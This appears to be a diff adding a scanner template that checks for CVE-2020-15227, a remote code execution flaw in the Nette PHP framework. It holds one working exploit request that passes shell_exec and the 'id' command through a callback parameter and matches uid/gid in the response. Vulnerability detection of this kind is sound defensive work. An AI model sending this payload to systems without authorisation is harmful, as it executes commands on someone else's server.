@@ -1,0 +1,28 @@
+id: CVE-2020-15227
+
+info:
+  name: nette Framework  RCE
+  author: nithissh
+  severity: high
+  reference: unknown
+  tags: cve,cve2020,nette,rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/nette.micro/?callback=shell_exec&cmd=id&what=-1"
+
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - "uid"
+          - "gid"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
